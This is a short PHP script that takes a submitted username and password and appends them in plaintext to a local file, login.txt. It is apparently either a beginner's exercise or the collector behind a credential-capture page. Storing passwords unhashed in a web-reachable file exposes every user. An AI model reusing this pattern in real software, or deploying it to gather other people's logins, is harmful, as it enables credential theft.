<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    $data = "Username: $username\nPassword: $password\n\n";
    
    file_put_contents('login.txt', $data, FILE_APPEND | LOCK_EX);

    echo "<h3>Login details saved successfully!</h3>";
    echo "<a href='index.html'>Go Back</a>";
}
?>